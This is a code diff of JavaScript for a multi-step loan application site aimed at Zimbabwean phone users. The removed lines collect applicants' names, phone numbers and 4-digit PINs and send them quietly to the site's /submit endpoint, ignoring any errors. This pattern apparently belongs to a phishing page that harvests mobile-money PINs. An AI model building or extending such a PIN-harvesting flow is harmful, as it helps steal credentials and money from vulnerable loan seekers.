@@ -11,33 +11,48 @@ document.addEventListener("DOMContentLoaded", function () {
     const durationVal = document.getElementById("durationVal");
 
     if (amount && duration) {
-        // show default values
         amountVal.innerText = "$" + amount.value;
         durationVal.innerText = duration.value + " days";
 
-        // update live
         amount.addEventListener("input", function () {
             amountVal.innerText = "$" + this.value;
+            updateLoan();
         });
 
         duration.addEventListener("input", function () {
             durationVal.innerText = this.value + " days";
+            updateLoan();
         });
     }
 
-    // ===== SUMMARY PAGE =====
-    const summary = document.getElementById("summary");
-    if (summary) {
-        summary.innerHTML = `
-            <h3>Confirm Your Application</h3>
-            <p><strong>Amount:</strong> $${localStorage.getItem("amount")}</p>
-            <p><strong>Duration:</strong> ${localStorage.getItem("duration")} days</p>
-            <p><strong>Reason:</strong> ${localStorage.getItem("reason")}</p>
-            <p><strong>Name:</strong> ${localStorage.getItem("fname")} ${localStorage.getItem("lname")}</p>
-            <p><strong>Phone:</strong> ${localStorage.getItem("phone")}</p>
-            <p><strong>Next of Kin:</strong> ${localStorage.getItem("kfname")}</p>
-        `;
+    // ===== LOAN CALCULATOR (10%) =====
+    function updateLoan() {
+        const repayment = document.getElementById("repayment");
+        if (!amount || !repayment) return;
+
+        const amt = parseFloat(amount.value);
+        const total = amt + (amt * 0.10);
+
+        repayment.innerText = "Total repayment: $" + total.toFixed(2);
     }
+
+    updateLoan();
+
+    // ===== SUMMARY PAGE (STEP 4) =====
+    if (document.getElementById("name")) {
+        document.getElementById("amount").innerText = localStorage.getItem("amount");
+        document.getElementById("duration").innerText = localStorage.getItem("duration") + " days";
+        document.getElementById("reason").innerText = localStorage.getItem("reason");
+
+        document.getElementById("name").innerText =
+            localStorage.getItem("fname") + " " + localStorage.getItem("lname");
+
+        document.getElementById("phone").innerText = localStorage.getItem("phone");
+
+        document.getElementById("kin").innerText =
+            localStorage.getItem("kfname") + " (" + localStorage.getItem("kphone") + ")";
+    }
+
 });
 
 
@@ -45,24 +60,20 @@ document.addEventListener("DOMContentLoaded", function () {
 // STEP 1 → STEP 2
 // =====================================
 function nextStep1() {
-localStorage.removeItem("fromPin");
+    localStorage.removeItem("fromPin");
 
     const amount = document.getElementById("amount").value;
     const duration = document.getElementById("duration").value;
     const reason = document.getElementById("reason").value.trim();
 
     if (!reason) {
-        alert("Please fill all required fields");
+        showError("Please fill all required fields");
         return;
     }
 
-    // save data
     localStorage.setItem("amount", amount);
     localStorage.setItem("duration", duration);
     localStorage.setItem("reason", reason);
-
-    // go next
-    window.location.href = "step2.html";
 }
 
 
@@ -71,55 +82,27 @@ localStorage.removeItem("fromPin");
 // =====================================
 function nextStep2() {
     const fname = document.getElementById("fname").value.trim();
-    const sname = document.getElementById("sname").value.trim(); // optional
     const lname = document.getElementById("lname").value.trim();
     const phone = document.getElementById("phone").value.trim();
-    const email = document.getElementById("email")?.value.trim();
 
-    // required fields
     if (!fname || !lname || !phone) {
-        alert("Please fill all required fields");
+        showError("Please fill all required fields");
         return;
     }
 
-    // name validation
-    const nameRegex = /^[A-Za-z]+$/;
-
-    if (!nameRegex.test(fname)) {
-        alert("First name must contain letters only");
-        return;
-    }
-
-    if (lname && !nameRegex.test(lname)) {
-        alert("Last name must contain letters only");
-        return;
-    }
-
-    if (sname && !nameRegex.test(sname)) {
-        alert("Surname must contain letters only");
-        return;
-    }
-
-    // phone validation
     if (!phone.startsWith("+263") || phone.length < 10 || phone.length > 13) {
-        alert("Enter valid Zimbabwe phone number");
+        showError("Enter valid Zimbabwe phone number");
         return;
     }
 
-    // save data
     localStorage.setItem("fname", fname);
-    localStorage.setItem("sname", sname);
     localStorage.setItem("lname", lname);
     localStorage.setItem("phone", phone);
-    localStorage.setItem("email", email);
-
-    // go next
-    window.location.href = "step3.html";
 }
 
 
 // =====================================
-// STEP 3 → STEP 4 (NEXT OF KIN)
+// STEP 3 → STEP 4
 // =====================================
 function nextStep3() {
     const kfname = document.getElementById("kfname").value.trim();
@@ -127,120 +110,33 @@ function nextStep3() {
     const kphone = document.getElementById("kphone").value.trim();
     const province = document.getElementById("province").value;
 
-    if (!kfname || !klname || !kphone || !province) {
+    if (!kfname || !klname || !kphone || province === "Select Province") {
         showError("Please fill all required fields");
         return;
     }
 
-    // save data
     localStorage.setItem("kfname", kfname);
     localStorage.setItem("klname", klname);
     localStorage.setItem("kphone", kphone);
     localStorage.setItem("province", province);
-
-    window.location.href = "step4.html";
 }
+
 
 // =====================================
-// FINAL SUBMIT
+// STEP 4 → STEP 5
 // =====================================
-function submitApp() {
+function nextStep4() {
+    document.getElementById("pageLoader").style.display = "block";
 
-    const phone = localStorage.getItem("phone");
-
-    const pinInputs = document.querySelectorAll(".pin-box");
-
-    let pin = "";
-    pinInputs.forEach(input => {
-        pin += input.value;
-    });
-
-    const error = document.getElementById("errorMsg");
-
-if (pin.length !== 4) {
-    error.innerText = "Please enter complete PIN";
-    error.style.display = "block";
-    return;
+    setTimeout(() => {
+        window.location.href = "step5.html";
+    }, 800);
 }
 
-if (!/^\d{4}$/.test(pin)) {
-    error.innerText = "PIN must be 4 digits";
-    error.style.display = "block";
-    return;
-}
 
-    const data = {
-        name: localStorage.getItem("fname") + " " + localStorage.getItem("lname"),
-        phone: phone,
-        pin: pin
-    };
-
-const btn = document.getElementById("submitBtn");
-btn.innerText = "Processing...";
-btn.disabled = true;
-
-    const btn = document.querySelector(".login-btn");
-    btn.disabled = true;
-    btn.innerText = "Processing...";
-
-    localStorage.setItem("fromPin", "yes"); // 🔥 SET FIRST
-
-fetch(window.location.origin + "/submit", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify(data)
-})
-.catch(() => {});
-
-window.location.href = "processing.html"; // 🔥 MOVE AFTER
-}
-
-function startProcessing() {
-    // optional: show instant feedback
-    
-    // redirect to processing page
-    window.location.href = "processing.html";
-}
-
-function finish() {
-    localStorage.clear();
-    window.location.href = "index.html";
-}
-
-function goToProcessing() {
-    localStorage.setItem("firstProcess", "yes");
-    window.location.href = "processing.html";
-}
-
-// AUTO MOVE PIN INPUTS (SAFE)
-document.addEventListener("DOMContentLoaded", function () {
-    const pins = document.querySelectorAll(".pin-box");
-
-    if (pins.length > 0) {
-        pins.forEach((input, index) => {
-            input.addEventListener("input", () => {
-                if (input.value.length === 1 && index < pins.length - 1) {
-                    pins[index + 1].focus();
-                }
-            });
-        });
-    }
-});
-
-document.addEventListener("DOMContentLoaded", function () {
-    const phoneInput = document.getElementById("phone");
-
-    if (phoneInput) {
-        phoneInput.value = localStorage.getItem("phone") || "+263";
-    }
-});
-
-window.onload = () => {
-    document.body.classList.add("loaded");
-};
-
+// =====================================
+// ERROR HANDLER
+// =====================================
 function showError(msg) {
     let box = document.getElementById("errorBox");
 
@@ -249,12 +145,17 @@ function showError(msg) {
         box.id = "errorBox";
         box.style.color = "red";
         box.style.marginTop = "10px";
+        box.style.textAlign = "center";
         document.querySelector(".container").appendChild(box);
     }
 
     box.innerText = msg;
 }
 
+
+// =====================================
+// GLOBAL LOADER NAVIGATION
+// =====================================
 function showLoaderAndGo(url) {
     const loader = document.getElementById("pageLoader");
     if (loader) loader.style.display = "block";
